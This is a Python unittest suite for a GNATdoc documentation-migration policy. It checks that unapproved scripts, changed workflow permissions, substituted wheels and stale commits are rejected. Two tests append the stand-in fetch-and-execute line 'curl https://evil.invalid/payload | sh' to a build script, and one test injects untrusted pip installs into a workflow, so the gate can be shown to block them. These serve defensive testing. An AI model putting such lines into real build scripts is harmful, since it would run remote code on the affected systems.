"""Negative-first envelope qualification; passing never authorizes a bootstrap."""
import copy
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import patch

from gnatdoc_migration_policy import (
    ROOT, WHEEL, MIGRATION, CONFIGURATION, TEST_REPAIRS, WORKFLOW,
    envelope, migration_workflow, migration_generator, verify_wheel, native_output,
    verify_current_commit,
    installed_wheel, staged_public, PUBLIC, shell_commands,
)
from additive_gnatdoc_policy import (
    candidate_rules, historical_inputs, inventory, compatible, exact_snapshot, coverage,
)
from validate_gnatdoc_inputs import validate


class MigrationPolicyTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        from gnatdoc_test_fixtures import legacy_policy
        policy = legacy_policy(ROOT, Path(self.temp.name) / "legacy")
        self.enterContext(patch(__name__ + ".ROOT", policy))
        self.enterContext(patch("additive_gnatdoc_policy.ROOT", policy))
        self.candidate = Path(self.temp.name) / "candidate"
        subprocess.run(["git", "clone", "--quiet", "--shared", str(policy),
                        str(self.candidate)], check=True)

    def write(self, name, data):
        path = self.candidate / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return path

    def mutate(self, name):
        path = self.candidate / name
        return self.write(name, path.read_bytes() + b"\n# unreviewed mutation\n")

    def migration(self):
        # Deliberately not executable production configuration: scope recognition
        # cannot substitute for the full independent output campaign.
        for name in CONFIGURATION:
            self.write(name, b"fixture only\n")
        self.write(WORKFLOW, migration_workflow((ROOT / WORKFLOW).read_text()).encode())
        name = "scripts/generate_docs.sh"
        self.write(name, migration_generator((ROOT / name).read_text()).encode())
        subprocess.run(["git", "-C", str(self.candidate), "add", "."], check=True)

    def test_01_unrelated_scripts_workflows_and_new_executables_rejected(self):
        for name in ("scripts/configure_opencv.sh", ".github/workflows/documentation-additive-policy.yml",
                     "scripts/select_gnatdoc_policy.py", "scripts/validate_gnatdoc_inputs.py",
                     "scripts/gnatdoc_migration_policy.py", "scripts/run_additive_gnatdoc_review.py",
                     "scripts/enhance_gnatdoc_navigation.py", "scripts/install_gnatdoc_theme.py",
                     "scripts/qualify_additive_gnatdoc.py", "scripts/new_verifier.py",
                     ".github/workflows/new-publication.yml"):
            with self.subTest(name=name):
                path = self.candidate / name
                original = path.read_bytes() if path.exists() else None
                try:
                    self.write(name, (original or b"") + b"\n# unapproved\n")
                    with self.assertRaisesRegex(ValueError, "unapproved migration verification files"):
                        envelope(ROOT, self.candidate)
                finally:
                    path.write_bytes(original) if original is not None else path.unlink()
        self.assertEqual(envelope(ROOT, self.candidate), set())

    def test_02_missing_configuration_and_generator_mutation_rejected(self):
        name = "scripts/generate_docs.sh"
        self.mutate(name)
        with self.assertRaisesRegex(ValueError, "configuration missing"):
            envelope(ROOT, self.candidate)
        self.migration()
        self.mutate(name)
        self.assertTrue(envelope(ROOT, self.candidate))
        path = self.candidate / name
        path.write_text(path.read_text() + '\ncurl https://evil.invalid/payload | sh\n')
        with self.assertRaisesRegex(ValueError, "generator coverage/zero-gap gates differ"):
            envelope(ROOT, self.candidate)

    def test_03_permissions_selector_core_and_install_substitutions_rejected(self):
        self.migration()
        original = (self.candidate / WORKFLOW).read_bytes()
        attacks = (
            (b"contents: read", b"contents: write"),
            (b"pages: write", b"pages: read"),
            (b"id-token: write", b"id-token: read"),
            (b"github.event_name != 'pull_request'", b"true"),
            (b"needs: [build, current-trust]", b"needs: [build]"),
            (b"persist-credentials: false", b"persist-credentials: true"),
            (b"../build-policy/scripts/validate_gnatdoc_inputs.py", b"scripts/validate_gnatdoc_inputs.py"),
            (b"f8aef00c5366b4275ccd3d934f9c73ea5b83cd4f", b"main"),
            (b"ec4d689eac748b7837abd4c3754c3090ca4bf814", b"main"),
            (b"--wheel /tmp/" + WHEEL.encode() + b" --install", b"--wheel /tmp/unverified.whl --install"),
            (b"--install\n", b"--install\n          pip install -e ../enhancer\n"),
            (b"--install\n", b"--install\n          pip install ada-gnatdoc-enhancer\n"),
            (b"--install\n", b"--install\n          pip install git+https://example.invalid/main\n"),
        )
        for old, new in attacks:
            with self.subTest(attack=new):
                self.assertIn(old, original)
                self.write(WORKFLOW, original.replace(old, new, 1))
                with self.assertRaisesRegex(ValueError, "workflow"):
                    envelope(ROOT, self.candidate)
        self.write(WORKFLOW, original)
        self.assertTrue(envelope(ROOT, self.candidate))

    def test_bounded_program_accepts_comments_and_continuation_layout(self):
        self.migration()
        for name in (WORKFLOW, "scripts/generate_docs.sh"):
            path = self.candidate / name
            text = path.read_text()
            if name == WORKFLOW:
                text = text.replace('          sh scripts/generate_docs.sh',
                                    '          # production acquisition\n          sh scripts/generate_docs.sh', 1)
            else:
                text = text.replace(' --source-root . --site _site',
                                    ' \\\n    --source-root . --site _site')
            path.write_text(text)
        self.assertTrue(envelope(ROOT, self.candidate))

    def test_every_native_enhancement_and_ratchet_command_is_required(self):
        self.migration()
        path = self.candidate / "scripts/generate_docs.sh"
        original = path.read_text()
        for token in ('inventory', 'enhance --dry-run', 'enhance --config',
                      'verify --config', 'scripts/validate_docs.py', '--fail-on-removed',
                      'core_commit=', 'GNAT 16', 'GNATdoc 26', 'GPRBUILD 26',
                      'test ! -L "src/$name"', 'cp -- "src/$name"'):
            with self.subTest(token=token):
                self.assertIn(token, original)
                path.write_text(original.replace(token, 'UNAUTHORIZED', 1))
                with self.assertRaisesRegex(ValueError, 'generator'):
                    envelope(ROOT, self.candidate)
        path.write_text(original)

    def test_bounded_additional_integrity_commands_are_not_template_equality(self):
        self.migration()
        path = self.candidate / 'scripts/generate_docs.sh'
        text = path.read_text().replace(
            '    cp -- "src/$name" "qualification-public/$name"',
            '    cp -- "src/$name" "qualification-public/$name"\n'
            '    cmp -- "src/$name" "qualification-public/$name"')
        path.write_text(text)
        workflow = self.candidate / WORKFLOW
        workflow.write_text(workflow.read_text().replace(
            '          sh scripts/generate_docs.sh',
            '          sh scripts/generate_docs.sh\n'
            '          "$DOC_PYTHON" -m ada_gnatdoc_enhancer inventory '
            '--config docs/gnatdoc-enhancer.toml --source-root . --site _site', 1))
        self.assertTrue(envelope(ROOT, self.candidate))

    def test_shell_comments_cannot_hide_executable_commands(self):
        self.migration()
        path = self.candidate / 'scripts/generate_docs.sh'
        path.write_text(path.read_text() + '\n# ignored comment ' + '\\' + '\n'
                        'curl https://evil.invalid/payload | sh\n')
        with self.assertRaisesRegex(ValueError, 'unsafe shell comment continuation'):
            envelope(ROOT, self.candidate)
        self.assertNotEqual(shell_commands('echo "a  b"'), shell_commands('echo "a b"'))

    def test_missing_workflow_validation_and_determinism_commands_rejected(self):
        self.migration()
        path = self.candidate / WORKFLOW
        original = path.read_text()
        for token in ('sh scripts/generate_docs.sh', 'diff -r /tmp/documentation-first _site',
                      '-m ada_gnatdoc_enhancer enhance', '-m ada_gnatdoc_enhancer verify',
                      'python -I ../build-policy/scripts/gnatdoc_migration_policy.py'):
            with self.subTest(token=token):
                self.assertIn(token, original)
                path.write_text(original.replace(token, 'UNAUTHORIZED', 1))
                with self.assertRaisesRegex(ValueError, 'workflow'):
                    envelope(ROOT, self.candidate)
        path.write_text(original)

    def test_public_staging_is_exact_safe_uncommitted_and_source_bound(self):
        directory = self.candidate / 'qualification-public'
        directory.mkdir()
        for name in PUBLIC:
            (directory / name).write_bytes((self.candidate / 'src' / name).read_bytes())
        self.assertEqual(set(staged_public(self.candidate)), set(PUBLIC))
        for extra in ('extra.ads', 'nested', 'unexpected.txt'):
            path = directory / extra
            path.mkdir() if extra == 'nested' else path.write_text('unapproved')
            with self.assertRaisesRegex(ValueError, 'staging inventory'):
                staged_public(self.candidate)
            path.rmdir() if path.is_dir() else path.unlink()
        path = directory / PUBLIC[0]
        original = path.read_bytes()
        path.write_bytes(original + b'\n')
        with self.assertRaisesRegex(ValueError, 'staged source differs'):
            staged_public(self.candidate)
        path.unlink()
        path.symlink_to(self.candidate / 'src' / PUBLIC[0])
        with self.assertRaisesRegex(ValueError, 'substituted policy input'):
            staged_public(self.candidate)
        path.unlink()
        path.write_bytes(original)
        subprocess.run(['git', '-C', str(self.candidate), 'add', 'qualification-public'], check=True)
        with self.assertRaisesRegex(ValueError, 'must not be committed'):
            staged_public(self.candidate)

    def test_04_build_dependencies_and_unrelated_migration_inputs_rejected(self):
        self.migration()
        name = "alire.toml"
        original = (self.candidate / name).read_bytes()
        self.write(name, original + b'\n[[depends-on]]\nunexpected = "*"\n')
        with self.assertRaisesRegex(ValueError, "trusted build input changed: alire.toml"):
            validate(self.candidate, ROOT)
        with self.assertRaisesRegex(ValueError, "migration includes unrelated files"):
            envelope(ROOT, self.candidate)
        self.write(name, original)
        self.mutate("src/opencv-geometry.ads")
        with self.assertRaisesRegex(ValueError, "migration includes unrelated files"):
            envelope(ROOT, self.candidate)

    def test_05_substituted_corrupt_wrong_version_wheels_rejected(self):
        wheel = Path(self.temp.name) / WHEEL
        for data in (b"corrupt", b"version=0.1.4", b"version=0.1.5 unverified substitute"):
            wheel.write_bytes(data)
            with self.subTest(data=data), self.assertRaisesRegex(ValueError, "official v0.1.5 wheel identity differs"):
                verify_wheel(wheel)
        wheel.unlink()
        wheel.symlink_to(ROOT / "alire.toml")
        with self.assertRaisesRegex(ValueError, "substituted policy input"):
            verify_wheel(wheel)

    def test_06_historical_evidence_and_existing_declarations_rejected(self):
        name = "docs/evidence/gnatdoc009/type-link-occurrences.json"
        self.mutate(name)
        with self.assertRaisesRegex(ValueError, "historical evidence modified"):
            historical_inputs(self.candidate)
        old = inventory(ROOT)
        changed = copy.deepcopy(old)
        changed["opencv.geometry"].pop()
        with self.assertRaisesRegex(ValueError, "published declaration removed or modified"):
            compatible(old, changed)

    def test_07_changed_candidate_commit_rejected(self):
        revision = subprocess.check_output(["git", "-C", str(self.candidate), "rev-parse", "HEAD"],
                                           text=True).strip()
        self.mutate("docs/documentation.md")
        subprocess.run(["git", "-C", str(self.candidate), "add", "."], check=True)
        subprocess.run(["git", "-C", str(self.candidate), "-c", "user.name=Fixture",
                        "-c", "user.email=fixture@invalid.example", "commit", "--quiet",
                        "-m", "Changed candidate after verification"], check=True)
        with self.assertRaisesRegex(ValueError, "stale/substituted candidate commit"):
            verify_current_commit(self.candidate, revision)
        with self.assertRaisesRegex(ValueError, "candidate snapshot changed: docs/documentation.md"):
            exact_snapshot(self.candidate, self.candidate, revision)

    def test_08_scope_recognition_is_not_output_approval(self):
        self.migration()
        authorized = envelope(ROOT, self.candidate)
        self.assertEqual(authorized, CONFIGURATION | {WORKFLOW, "scripts/generate_docs.sh"})
        self.assertTrue(authorized <= MIGRATION)
        # Full source rules still run independently, without parsing candidate code.
        self.assertEqual(candidate_rules(ROOT, self.candidate)["declarations"],
                         sum(map(len, inventory(ROOT).values())))

    def test_09_contemporary_test_repair_scope(self):
        for name in TEST_REPAIRS:
            self.mutate(name)
        self.assertEqual(envelope(ROOT, self.candidate), TEST_REPAIRS)
        self.mutate("scripts/check_doc_coverage.py")
        with self.assertRaisesRegex(ValueError, "unapproved migration verification files"):
            envelope(ROOT, self.candidate)

    def test_migrated_input_is_not_unconditionally_accepted(self):
        self.migration()
        with self.assertRaises(ValueError):
            migration_generator((self.candidate / "scripts/generate_docs.sh").read_text())

    def test_synthetic_migration_is_exact_parent_bound_not_a_path_exemption(self):
        from additive_gnatdoc_fixture import create, expected, validate as fixture_validate
        self.migration()
        subprocess.run(["git", "-C", str(self.candidate), "-c", "user.name=Fixture",
                        "-c", "user.email=fixture@invalid.example", "commit", "--quiet",
                        "-m", "Migration parent"], check=True)
        revision = subprocess.check_output(["git", "-C", str(self.candidate), "rev-parse", "HEAD"],
                                           text=True).strip()
        fixture = Path(self.temp.name) / "synthetic"
        create(fixture, revision, self.candidate)
        fixture_validate(fixture, ROOT)
        self.assertTrue(envelope(ROOT, fixture, synthetic=True))
        with self.assertRaisesRegex(ValueError, "migration includes unrelated files"):
            envelope(ROOT, fixture)
        names = set(expected(self.candidate)) | {"scripts/new_verifier.py", "alire.toml",
                    "docs/evidence/gnatdoc009/type-link-occurrences.json"}
        for name in sorted(names):
            path = fixture / name
            original = path.read_bytes() if path.exists() else None
            try:
                path.write_bytes((original or b"") + b"\nunauthorized\n")
                with self.subTest(name=name), self.assertRaises(ValueError):
                    envelope(ROOT, fixture, synthetic=True)
            finally:
                path.write_bytes(original) if original is not None else path.unlink()
        self.assertTrue(envelope(ROOT, fixture, synthetic=True))

    def test_10_source_editable_floating_and_wrong_installed_version_rejected(self):
        import json
        from unittest.mock import Mock
        distribution = Mock()
        distribution.version = "0.1.4"
        with patch("gnatdoc_migration_policy.verify_wheel"), patch(
                "gnatdoc_migration_policy.importlib.metadata.distribution", return_value=distribution):
            with self.assertRaisesRegex(ValueError, "installed enhancer version differs"):
                installed_wheel(Path("unused.whl"))
            distribution.version = "0.1.5"
            for record in ({}, {"dir_info": {"editable": True}},
                           {"vcs_info": {"requested_revision": "main"}},
                           {"archive_info": {"hashes": {"sha256": "0" * 64}}}):
                distribution.read_text.return_value = json.dumps(record)
                with self.subTest(record=record), self.assertRaisesRegex(
                        ValueError, "installed enhancer is not the official wheel"):
                    installed_wheel(Path("unused.whl"))

    def test_11_incorrect_resolved_core_and_lock_rejected(self):
        from unittest.mock import Mock
        from qualify_shared_gnatdoc_shadow import resolved_core
        session = Mock()
        source, core = Path("/qualification/geometry"), Path("/qualification/core")
        session.run.return_value = "/untrusted/core"
        with self.assertRaisesRegex(ValueError, "incorrect Alire Core resolution"):
            resolved_core(session, source, core)
        session.run.return_value = str(core)
        lock = b'''[[solution.state]]
crate="opencv_core"
fulfilment="linked"
[solution.state.link]
path="../wrong-core"
'''
        with patch("qualify_shared_gnatdoc_shadow.regular", return_value=lock):
            with self.assertRaisesRegex(ValueError, "incorrect Core lock"):
                resolved_core(session, source, core)


class OutputBoundaryTests(unittest.TestCase):
    def test_navigation_checks_use_explicit_source_not_policy_checkout(self):
        import enhance_gnatdoc_navigation as navigation
        from install_gnatdoc_theme import themed
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            api = root / "site/api"
            api.mkdir(parents=True)
            source, categories = root / "src", root / "docs/api-categories.json"
            with patch.object(navigation, "entries", return_value=[]) as entries:
                native, _ = navigation.native_index(api, source, categories)
                rendered = navigation.augmented(themed(native), api, source, categories)
                (api / "index.html").write_text(rendered)
                (api / "gnatdoc-navigation.js").write_bytes(navigation.ASSET.read_bytes())
                self.assertEqual(navigation.check_navigation(api, source, categories), 0)
                self.assertTrue(entries.call_args_list)
                self.assertTrue(all(call.args == (api, source, categories)
                                    for call in entries.call_args_list))
                (api / "index.html").write_text(rendered + "<!-- tampered -->")
                with self.assertRaisesRegex(ValueError, "unapproved navigation shell"):
                    navigation.check_navigation(api, source, categories)

    def test_theme_checks_forward_explicit_navigation_source(self):
        import json
        import hashlib
        import install_gnatdoc_theme as theme
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            api = root / "api"
            api.mkdir()
            source, categories = root / "src", root / "docs/api-categories.json"
            native = '<html>' + theme.NATIVE + '<body>native</body>'
            rendered = theme.themed(native)
            (api / "index.html").write_text(rendered)
            (api / "gnatdoc-navigation.js").write_text("fixture")
            (api / "gnatdoc.css").write_bytes(b"native stylesheet")
            (api / "gnatdoc-theme.css").write_bytes(theme.ASSET.read_bytes())
            (api / "presentation.json").write_text(json.dumps({
                "version": 1, "pages": {"index.html": native},
                "native_css": hashlib.sha256(b"native stylesheet").hexdigest()}))
            with patch("enhance_gnatdoc_navigation.check_navigation") as check, patch(
                    "enhance_gnatdoc_navigation.augmented", return_value=rendered) as augment:
                theme.check_theme(api, source, categories)
                check.assert_called_once_with(api, source_root=source, categories_path=categories)
                augment.assert_called_once_with(rendered, api, source_root=source,
                                                categories_path=categories)
                check.side_effect = ValueError("source/native mismatch")
                with self.assertRaisesRegex(ValueError, "source/native mismatch"):
                    theme.check_theme(api, source, categories)

    def test_missing_or_altered_native_anchor_rejected(self):
        # Exercise the actual independent HTML reader, not a forged count report.
        with tempfile.TemporaryDirectory() as folder:
            before, after = (Path(folder) / name for name in ("before", "after"))
            for root, anchor in ((before, "original"), (after, "substitute")):
                (root / "api").mkdir(parents=True)
                (root / "api/pkg.html").write_text(
                    '<h1>OpenCV.Geometry</h1><h4 id=' + anchor + '>Compose</h4>'
                    '<pre class=ada-code-snippet><code>function Compose;</code></pre>')
            with self.assertRaisesRegex(ValueError, "native declaration/anchor inventory differs"):
                native_output(ROOT, before, after)
            (after / "api/pkg.html").write_text('<h1>OpenCV.Geometry</h1>')
            with self.assertRaisesRegex(ValueError, "native declaration/anchor inventory differs"):
                native_output(ROOT, before, after)

    def test_missing_or_altered_coverage_and_warnings_fail_closed(self):
        with tempfile.TemporaryDirectory() as folder:
            log = Path(folder) / "native.log"
            log.write_text("")
            for items, missing, errors in (({}, {"removed"}, []), ({}, set(), ["altered member"])):
                with patch("additive_gnatdoc_policy.check_site", return_value=(items, missing, errors)):
                    with self.assertRaisesRegex(ValueError, "current documentation gaps"):
                        coverage(ROOT, ROOT, log)
            log.write_text("warning: new undocumented declaration\n")
            with patch("additive_gnatdoc_policy.check_site", return_value=({"item": "function"}, set(), [])):
                with self.assertRaisesRegex(ValueError, "current native diagnostics are not clean"):
                    coverage(ROOT, ROOT, log)


if __name__ == "__main__":
    unittest.main()